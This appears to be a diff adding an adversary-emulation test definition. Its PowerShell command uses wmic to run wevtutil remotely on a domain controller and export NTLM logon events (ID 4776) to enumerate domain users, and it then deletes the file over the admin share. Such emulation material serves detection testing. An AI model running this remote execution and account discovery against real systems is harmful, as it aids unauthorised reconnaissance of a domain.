@@ -1,0 +1,22 @@
+---
+- id: ffe23675b3b68eb6d2b6e771451de3af
+  name: Wevtutil - Discover NTLM Users Remote
+  description: "This test discovers users who have authenticated against a Domain\
+    \ Controller via NTLM. \nThis is done remotely via wmic and captures the event\
+    \ code 4776 from the domain controller and stores the ouput in C:\\temp. [Reference](https://www.reliaquest.com/blog/socgholish-fakeupdates/)\n"
+  tactic: discovery
+  technique:
+    attack_id: T1087.002
+    name: 'Account Discovery: Domain Account'
+  platforms:
+    windows:
+      psh:
+        command: $target = $env:LOGONSERVER; $target = $target.Trim("\\"); $IpAddress
+          = [System.Net.Dns]::GetHostAddresses($target) | select IPAddressToString
+          -ExpandProperty IPAddressToString; wmic.exe /node:$IpAddress process call
+          create 'wevtutil epl Security C:\\ntlmusers.evtx /q:\"Event[System[(EventID=4776)]]"'
+        payloads: []
+        cleanup: Remove-Item -Path \\$IpAddress\c$\ntlmusers.evtx
+        parsers:
+          plugins.atomic.app.parsers.atomic_powershell:
+          - source: validate_me
